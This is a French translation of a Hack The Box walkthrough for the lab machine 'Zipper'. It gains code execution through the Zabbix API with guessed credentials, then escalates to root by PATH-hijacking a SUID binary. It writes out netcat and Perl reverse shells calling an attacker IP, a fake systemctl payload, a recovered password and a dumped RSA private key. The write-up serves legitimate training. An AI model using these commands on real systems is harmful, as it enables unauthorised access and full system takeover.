---
title: "[FR] Zipper (Hard)"
slug: "fr-zipper-hard"
chapter: "linux"
priority: 0
editor: "wysiwyg"
revisionCount: 4
id: 32
createdAt: "2020-05-06T20:25:52Z"
createdBy: "mxrch"
updatedAt: "2022-03-11T17:45:43Z"
updatedBy: "blackwasp"
ownedBy: "mxrch"
views: 13
---
<p id="bkmrk-"><a href="/uploads/images/gallery/2020-05/yF4MkZZLKcv4T0Ux-zipper.PNG" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/yF4MkZZLKcv4T0Ux-zipper.PNG" alt="zipper.PNG"></a></p>
<h5 id="bkmrk-what-you-will-learn%3A">Ce que vous allez apprendre :</h5>
<ul id="bkmrk-api-to-rce-funky-she"><li>API vers RCE</li>
<li id="bkmrk-%C2%A0">De la magie pour obtenir un shell stable</li>
<li>Abus des binaires SUID</li>
<li>Manipulation de path</li>
</ul><h5 id="bkmrk-overview%3A">Vue d'ensemble :</h5>
<ul id="bkmrk-can-issue-api-calls-"><li>Faire des appels API en tant qu'utilisateur dont nous ne pouvons pas nous authentifier</li>
<li>Créer un script (par le biais d'appels API) et obtenir RCE en tant qu'utilisateur <code>zabbix</code> dans un conteneur</li>
<li>Créer un script perl reverse shell et le faire fonctionner sur l'agent zabbix (fonctionnant sur l'OS hôte)</li>
<li>L'escalation de privilèges est un binaire qui exécute la commande <code class="language-plaintext highlighter-rouge">systemctl daemon-reload</code></li>
<li>Nous pouvons détourner cette commande en créant notre propre fichier systemctl (avec un reverse shell), puis modifier le chemin d'accès au fichier SUID, et exécuter notre fichier au lieu de <code>/bin/systemctl</code></li>
</ul><h5 id="bkmrk-detailed-steps">Les étapes détaillées</h5>
<hr id="bkmrk--0"><p id="bkmrk-we%27ll-start-by-perfo">Nous allons commencer par effectuer une première reconnaissance :</p>
<pre id="bkmrk-nmap--ss--sv--sc--o-"><code class="language-bash">nmap -sS -sV -sC -O -p - 10.10.10.108     
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  zabbix-agent
</code></pre>
<p id="bkmrk-d%27apr%C3%A8s-la-version-s">D'après la version SSH, il s'agit probablement d'Ubuntu Bionic (18.04), nous avons un agent Zabbix sur le port 10050, et un site web sur le port 80.</p>
<p id="bkmrk-en-allant-sur-le-sit">En allant sur le site web, nous sommes accueillis par une page par défaut d'Apache2 Ubuntu :</p>
<p id="bkmrk--1"><a href="/uploads/images/gallery/2020-05/jFuX8bAaIwws3xoN-image-1588786206515.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/jFuX8bAaIwws3xoN-image-1588786206515.png" alt="image-1588786206515.png"></a></p>
<p id="bkmrk-so-lets-go-ahead-and">Alors, allons-y et lancons gobuster :</p>
<pre id="bkmrk-gobuster-dir--u-http"><code class="language-bash">gobuster dir -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html,zip -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.108
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html,zip
[+] Timeout:        10s
===============================================================
2020/05/06 13:32:22 Starting gobuster
===============================================================
/index.html (Status: 200)
/zabbix (Status: 301)
===============================================================</code></pre>
<p id="bkmrk-we-see-the-name-zabb">Nous retrouvons le nom de Zabbix. Zabbix est une suite logicielle conçue pour donner au personnel informatique une visibilité sur leur infrastructure informatique grâce à une interface graphique web et une API.<br>Ce que dit leur site web : <em>Monitor anything - Solutions for any kind of IT infrastructure, services, applications, resources.</em></p>
<p id="bkmrk--2"><a href="/uploads/images/gallery/2020-05/X16N5EFclcKTpfIM-image-1588786782129.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/X16N5EFclcKTpfIM-image-1588786782129.png" alt="image-1588786782129.png"></a></p>
<p id="bkmrk-we-get-this-login-pa">Nous obtenons cette page de connexion, nous n'avons pas d'identifiants mais il y a une option pour se connecter en tant qu'invité. Donc oui, c'est vraiment un outil de surveillance des serveurs, mais en tant qu'invité, nous ne pouvons voir qu'un tableau de bord.</p>
<p id="bkmrk-after-some-enumerati">Après un peu d'énumération, nous remarquerons dans : Monitoring -&gt; Latest data, Zapper's Backup Script</p>
<p id="bkmrk--3"><a href="/uploads/images/gallery/2020-05/6HVQGicEcHpHn3Pq-image-1588786975042.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/6HVQGicEcHpHn3Pq-image-1588786975042.png" alt="image-1588786975042.png"></a></p>
<p id="bkmrk-now-we-have-a-potent">Maintenant, nous avons un potentiel user: <code>zapper</code>.<br>On peut essayer de bruteforce, mais un simple essai aura suffit, le mot de passe est le pseudo.. <code>zapper : zapper</code></p>
<p id="bkmrk--4"><a href="/uploads/images/gallery/2020-05/xinB4eSvb7BWoc12-image-1588787184596.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/xinB4eSvb7BWoc12-image-1588787184596.png" alt="image-1588787184596.png"></a></p>
<p id="bkmrk-gui-access-disabled-"><code>GUI access disabled</code>, sur exploit-db il y a un exploit <strong>authenticated remote code execution </strong>pour une ancienne version de Zabbix : <a href="https://www.exploit-db.com/exploits/39937">https://www.exploit-db.com/exploits/39937</a>.<br>Malheureusment nos identifiants ne suffisent pas pour l'exécuter.</p>
<p id="bkmrk--5"><a href="/uploads/images/gallery/2020-05/8CbJV38QcCstOGXu-image-1588787294841.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/8CbJV38QcCstOGXu-image-1588787294841.png" alt="image-1588787294841.png"></a></p>
<p id="bkmrk-after-doing-a-good-a">Après avoir fait un bon nombre de recherches (et sachant que cette machine abuse des API), je me suis tourné vers l'API Zabbix, qui est documentée : https://www.zabbix.com/documentation/3.0/manual/api/reference.</p>
<p id="bkmrk-so-what-well-want-to">Donc ce que nous voudrons faire est simple :</p>
<ol id="bkmrk-%C2%A0log-into-the-api-%C2%A0g"><li> Se connecter dans l'API</li>
<li> Obtenir une liste d'Host IDs</li>
<li> Obtenir un reverse-shell en exécutant un script spécifiant les bons Host IDs</li>
</ol><p id="bkmrk--6"><a href="/uploads/images/gallery/2020-05/NxTJ2ghGgM8fQlN7-image-1588787642097.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/NxTJ2ghGgM8fQlN7-image-1588787642097.png" alt="image-1588787642097.png"></a></p>
<p id="bkmrk-to-interact-with-the">Pour intéragir avec l'API, je vais envoyer des requêtes <code class="highlighter-rouge">curl</code> POST à <code class="highlighter-rouge">/zabbix/api_jsonrpc.php</code></p>
<p id="bkmrk-so-we-need-to-login%2C">Nous devons donc nous connecter, pour ce faire, nous procéderons comme suit :</p>
<pre id="bkmrk-curl-http%3A%2F%2F10.10.10"><code class="language-bash">curl http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "zapper", "password": "zapper"}}'

{"jsonrpc":"2.0","result":"98d9e1f155c0be74352ccbb0f9b4e453","id":1}</code></pre>
<p id="bkmrk-before-you-can-acces">Avant de pouvoir accéder aux données de Zabbix, nous devons nous connecter et obtenir un token.<br>Après cela, nous pouvons nous connecter en utilisant la méthode <code>user.login</code> pour lister les utilisateurs :</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.get", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"output": "extend"}}' | jq .

{                      
  "jsonrpc": "2.0",    
  "result": [                                                   
    {                                                           
      "userid": "1",                                            
      "alias": "Admin",                                         
      "name": "Zabbix",                                         
      "surname": "Administrator",
      "url": "",        
      "autologin": "1",  
      "autologout": "0",    
      "lang": "en_GB",      
      "refresh": "30",      
      "type": "3",          
      "theme": "default",   
      "attempt_failed": "0",
      "attempt_ip": "",    
      "attempt_clock": "0",
      "rows_per_page": "50"
    },                 
    {                  
      "userid": "2",   
      "alias": "guest", 
      "name": "",       
      "surname": "",    
      "url": "",        
      "autologin": "1",  
      "autologout": "0",    
      "lang": "en_GB",      
      "refresh": "30",      
      "type": "1",          
      "theme": "default",   
      "attempt_failed": "0",
      "attempt_ip": "",    
      "attempt_clock": "0",
      "rows_per_page": "50"
    },                  
    {                   
      "userid": "3",    
      "alias": "zapper",
      "name": "zapper", 
      "surname": "",    
      "url": "",        
      "autologin": "0",  
      "autologout": "0",    
      "lang": "en_GB",      
      "refresh": "30",      
      "type": "3",          
      "theme": "default",   
      "attempt_failed": "0",
      "attempt_ip": "",    
      "attempt_clock": "0",
      "rows_per_page": "50"
    }                                                           
  ],                                                                                                                             
  "id": 1                                                                                                                        
}  </code></pre>
<p id="bkmrk-i-can-also-list-the-">Je peux aussi lister les hosts IDs, et voir qu'il y en a deux, nommés Zabbix et Zipper en utilisant la commande suivante :</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-0"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"host.get", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{}}' | jq .

...
      "hostid": "10106",
      "proxy_hostid": "0",
      "host": "Zipper",
...
      "hostid": "10105",                                                                                                         
      "proxy_hostid": "0",                                                                                                       
      "host": "Zabbix",  
...
</code></pre>
<p id="bkmrk-and-i-can-also-get-a">Et je peux aussi obtenir une liste des scripts actuellement présents :</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-1"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.get", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{}}' | jq .

{
  "jsonrpc": "2.0",
  "result": [
    {
      "scriptid": "1",
      "name": "Ping",
      "command": "/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1",
      "host_access": "2",
      "usrgrpid": "0",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    },
    {
      "scriptid": "2",
      "name": "Traceroute",
      "command": "/usr/bin/traceroute {HOST.CONN} 2&gt;&amp;1",
      "host_access": "2",
      "usrgrpid": "0",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    },
    {
      "scriptid": "3",
      "name": "Detect operating system",
      "command": "sudo /usr/bin/nmap -O {HOST.CONN} 2&gt;&amp;1",
      "host_access": "2",
      "usrgrpid": "7",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    }
  ],
  "id": 1
}
</code></pre>
<p id="bkmrk-now-in-theory-there-">En théorie, il existe maintenant de multiples façons d'obtenir un shell. J'en connais deux, mais j'ai vu quelqu'un le faire de quatre manières différentes. Dans ce walkthrough, nous allons simplement le faire par l'API.</p>
<p id="bkmrk-i-listed-the-hosts-t">J'ai énuméré les hôtes que cette instance de Zabbix contrôle. L'un s'appelait Zabbix, et l'autre Zipper. Donc pour attaquer Zipper, je vais prendre son host ID (10106), et créer un script pour exécuter ce que je veux (https://www.zabbix.com/documentation/3.0/manual/api/reference/script/create)</p>
<ul id="bkmrk-%22command%22%3A-%22id%22---th"><li><code class="highlighter-rouge">"command": "id"</code> - la commande à exécuter</li>
<li><code class="highlighter-rouge">"name": "test"</code> - ça peut être n'importe quoi</li>
<li><code class="highlighter-rouge">"execute_on": 0</code> - où exécuter le script. Si je ne le précise pas, la valeur par défaut est 1, ce qui signifie qu'il sera exécuté sur le serveur Zabbix.</li>
</ul><p id="bkmrk-but-i-want-to-run-it">Mais je veux l'exécuter sur l'agent Zabbix, donc je vais passer à 0.</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-2"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"command": "id", "name": "test", "execute_on": 0}}' | jq .

{
  "jsonrpc": "2.0",
  "result": {
    "scriptids": [
      "4"
    ]
  },
  "id": 1
}
</code></pre>
<p id="bkmrk-i-get-back-the-scrip">Je récupère le script id de 4. Maintenant, je vais le lancer avec <code>script.execute</code> :</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-3"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"hostid": 10106, "scriptid": 4}}' | jq .

{
  "jsonrpc": "2.0",
  "result": {
    "response": "success",
    "value": "uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)"
  },
  "id": 1
}
</code></pre>
<p id="bkmrk-as-you-can-see-the-c">Comme vous pouvez le voir, la commande a été exécutée et a affiché l'ID (zabbix), donc nous savons qu'elle fonctionne.<br>Maintenant, faisons la même chose mais pour obtenir un reverse shell.</p>
<p id="bkmrk-so-lets-upload-the-s">Uploadons le script :</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-4"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"scriptid": 4, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.31 443 &gt;/tmp/f"}}' | jq -c .

{"jsonrpc":"2.0","result":{"scriptids":[4]},"id":1}
</code></pre>
<p id="bkmrk-%C2%A0-1"> </p>
<p id="bkmrk-now-i%E2%80%99ll-hit-the-scr">Maintenant je vais utiliser l'API <code>script.execute</code> à nouveau pour exécuter le script que je viens d'upload :</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-5"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"hostid": 10106, "scriptid": 4}}' | jq -c .

{"jsonrpc":"2.0","error":{"code":-32500,"message":"Application error.","data":"Timeout while executing a shell script."},"id":1}</code></pre>
<p id="bkmrk-his-time-it-just-han">Il crash (et éventuellement ne répond plus), cela me donne environ 10 secondes pour faire ce que je veux :</p>
<p id="bkmrk--7"><a href="/uploads/images/gallery/2020-05/mrSthUEMnaz8VEVc-image-1588790020487.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/mrSthUEMnaz8VEVc-image-1588790020487.png" alt="image-1588790020487.png"></a></p>
<p id="bkmrk-so-we%27ll-want-to-get">Il faut donc un shell plus stable... Pour ce faire, nous allons lancer un second reverse shell dans la fenêtre afin de pouvoir exécuter les commandes bash quand le premier reverse shell reviendra.</p>
<pre id="bkmrk-perl--e-%27use-socket%3B"><code class="language-perl">perl -e 'use Socket;$i="10.10.14.31";$p=445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre>
<pre id="bkmrk-%3D%3D%3D-step-1-%3D%3D%3D-curl-"><code class="language-bash">=== Step 1 	===
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"command": "id", "name": "shell", "execute_on": 0}}' | jq .

{
  "jsonrpc": "2.0",
  "result": {
    "scriptids": [
      "5"
    ]
  },
  "id": 1
}

=== Step 2 	===
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"scriptid": 5, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.31 443 &gt;/tmp/f"}}' | jq -c .
{"jsonrpc":"2.0","result":{"scriptids":[5]},"id":1}

=== Step 3 	===
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"hostid": "10106", "scriptid": 5}}' | jq -c .
</code></pre>
<p id="bkmrk-%C2%A0-2"> </p>
<p id="bkmrk--8"><a href="/uploads/images/gallery/2020-05/wKEcAwyyewxDDnA5-image-1588791173185.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/wKEcAwyyewxDDnA5-image-1588791173185.png" alt="image-1588791173185.png"></a></p>
<p id="bkmrk-now-we-have-a-shell-">Nous avons maintenant un shell en tant que zabbix mais le fichier user.txt appartient à zapper, nous devrons donc faire une escalade de privilège vers zapper.</p>
<p id="bkmrk--9"><a href="/uploads/images/gallery/2020-05/VcMwnh2rka4QLhtF-image-1588791568967.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/VcMwnh2rka4QLhtF-image-1588791568967.png" alt="image-1588791568967.png"></a></p>
<p id="bkmrk-we%27ll-quickly-load-l">On va charger linpeas.sh et linenum.sh et espérer que ça rende l'énumération plus simple :</p>
<pre id="bkmrk-%24-wget-http%3A%2F%2F10.10."><code class="language-bash">$ wget http://10.10.14.31/linpeas.sh
--2020-05-06 15:06:36--  http://10.10.14.31/linpeas.sh
Connecting to 10.10.14.31:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 160507 (157K) [text/x-sh]
Saving to: ‘linpeas.sh’

     0K .......... .......... .......... .......... .......... 31%  524K 0s
    50K .......... .......... .......... .......... .......... 63%  534K 0s
   100K .......... .......... .......... .......... .......... 95%  560K 0s
   150K ......                                                100%  274K=0.3s

2020-05-06 15:06:37 (518 KB/s) - ‘linpeas.sh’ saved [160507/160507]

$ chmod +x linpeas.sh
</code></pre>
<p id="bkmrk-inside-of-utils-loca">À l'intérieur de "utils" dans le dossier /home/zapper nous trouvons 2 fichiers : <code>backup.sh</code> et <code>zabbix-service</code>.</p>
<p id="bkmrk--10"><a href="/uploads/images/gallery/2020-05/d0G9DjKaTYPs3FoZ-image-1588791649402.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/d0G9DjKaTYPs3FoZ-image-1588791649402.png" alt="image-1588791649402.png"></a></p>
<p id="bkmrk-you-can-see-it-says-">A l'intérieur nous trouvons <code>-p ZippityDoDah</code>...oui c'est le mot de passe de zapper ...</p>
<p id="bkmrk-%C2%A0-3"> </p>
<p id="bkmrk-now-we-have-user.txt">Nous avons maintenant le user.txt !</p>
<pre id="bkmrk-%24-python3--c-%27import"><code class="language-bash">$ python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@zipper:/home/zapper/utils$ su zapper
su zapper
Password: ZippityDoDah


              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗ 
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[&gt;] Backups:
4.0K    /backups/zapper_backup-2020-05-06.7z
                                      

zapper@zipper:~/utils$ 
</code></pre>
<p id="bkmrk--11"><a href="/uploads/images/gallery/2020-05/trvNrJPDK2Ya4y10-image-1588792607879.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/trvNrJPDK2Ya4y10-image-1588792607879.png" alt="image-1588792607879.png"></a></p>
<p id="bkmrk-now-we-have-to-privi">Nous allons maintenant devoir escalader vers le root.</p>
<p id="bkmrk-we%27ll-quickly-also-g">Nous allons aussi rapidement récupérer les clés SSH, au cas où.</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2F.ssh"><code class="language-">zapper@zipper:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR
l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67
GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+
eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M
2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi
eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz
+docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo
84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4
aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh
UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa
8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP
rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV
UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0
oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY
ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+
zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe
8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac
OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur
7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A
m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K
Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB
MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu
lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk
WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE
Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ=
-----END RSA PRIVATE KEY-----
</code></pre>
<p id="bkmrk-so-doing-some-basic-">Après une énumération basique nous trouvons un SUID sur zabbix-service :</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil"><code class="language-bash">zapper@zipper:~/utils$ find / -perm -u=s -type f 2&gt;/dev/null
/home/zapper/utils/zabbix-service</code></pre>
<p id="bkmrk-%C2%A0-4">Donc nous allons devoir comprendre comment exploiter ça... quand il est lancé, il nous demande soit de stopper ou démarrer le service, alors lançons "ltrace" pour voir :</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-0"><code class="language-bash">zapper@zipper:~/utils$ ./zabbix-service 
./zabbix-service 
start or stop?: start
start</code></pre>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-1"><code class="language-bash">zapper@zipper:~/utils$ ltrace ./zabbix-service 
ltrace ./zabbix-service 
__libc_start_main(0x42b6ed, 1, 0xbfacafd4, 0x42b840 &lt;unfinished ...&gt;
setuid(0)                                        = -1
setgid(0)                                        = -1
printf("start or stop?: ")                       = 16
fgets(start or stop?: start
start
"start\n", 10, 0xb7f2b5c0)                 = 0xbfacaf02
strcspn("start\n", "\n")                         = 5
strcmp("start", "start")                         = 0
system("systemctl daemon-reload &amp;&amp; syste"...Failed to reload daemon: The name org.freedesktop.PolicyKit1 was not provided by any .service files
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                           = 256
+++ exited (status 0) +++</code></pre>
<p id="bkmrk-based-on-the-ltrace-">En observant l'output de <code class="language-plaintext highlighter-rouge">ltrace</code>, on peut voir que le programme exécute <code class="language-plaintext highlighter-rouge">systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent</code> en tant qu'utilisateur root. L'appel se ferme vers la fin : <code class="highlighter-rouge">system("systemctl daemon-reload &amp;&amp; syste</code>. C'est un peu coupé, mais je vois mieux avec <code>strings</code> :</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-2"><code class="language-shell">zapper@zipper:~/utils$ strings zabbix-service | grep system
strings zabbix-service | grep system
system
systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent
systemctl stop zabbix-agent
system@@GLIBC_2.0</code></pre>
<p id="bkmrk-il-appelle-system-su">Il appelle <code class="highlighter-rouge">system</code> sur <code class="highlighter-rouge">systemctl</code> sans path. Si je change le path et que je l'appelle à nouveau, je peux remplacer systemctl avec mon propre payload.</p>
<p id="bkmrk-my-new-systemctl-loo">Mon nouveau systemctl ressemble à ça :</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-3"><code class="language-shell">zapper@zipper:~/utils$ chmod +x systemctl 
zapper@zipper:~/utils$ cat systemctl 
#!/bin/sh

rm /tmp/f2;mkfifo /tmp/f2;/bin/cat /tmp/f2|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.31 4444 &gt;/tmp/f2</code></pre>
<p id="bkmrk-we-will-add-%2Fhome%2Fza">Nous allons ajouter <code>/home/zapper/utils</code> en tant que première entrée dans la variable d'environnement <code>PATH</code>, pour que le système regarde ici en premier :<br><code>export PATH=/home/zapper/utils:$PATH</code></p>
<p id="bkmrk-this-is-changing-the">Cela change la variable <code>PATH</code> en <code>/home/zapper/utils:</code> + l'ancien path.</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-4"><code class="language-shell">zapper@zipper:~/utils$ echo $PATH
/home/zapper/utils:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
zapper@zipper:~/utils$ which systemctl
/home/zapper/utils/systemctl
zapper@zipper:~/utils$ ./zabbix-service 
start or stop?: start</code></pre>
<p id="bkmrk-we-are-now-root%21">Nous sommes maintenant root !</p>
<p id="bkmrk--12"><a href="/uploads/images/gallery/2020-05/zwglOsQagFSLLa20-image-1588794380869.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/zwglOsQagFSLLa20-image-1588794380869.png" alt="image-1588794380869.png"></a></p>
<p id="bkmrk--13"><a href="/uploads/images/gallery/2020-05/Tu0SdY0qAixFg5uo-image-1588794436052.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/Tu0SdY0qAixFg5uo-image-1588794436052.png" alt="image-1588794436052.png"></a></p>
<p id="bkmrk-%C2%A0-5"> </p>
<hr id="bkmrk--14"><h4 id="bkmrk-by-boschko">By Boschko | Traduit par mxrch</h4>
<ul id="bkmrk-my-hack-the-box%3A-htt"><li class="graf graf--p">My Hack The Box: <a class="markup--anchor markup--p-anchor" href="https://www.hackthebox.eu/home/users/profile/37879" target="_blank" rel="nofollow noopener" data-href="https://www.hackthebox.eu/home/users/profile/37879">https://www.hackthebox.eu/home/users/profile/37879</a></li>
<li class="graf graf--p">My Website: <a class="markup--anchor markup--p-anchor" href="https://olivierlaflamme.github.io/" target="_blank" rel="noopener nofollow noopener" data-href="https://olivierlaflamme.github.io/">https://olivierlaflamme.github.io/</a></li>
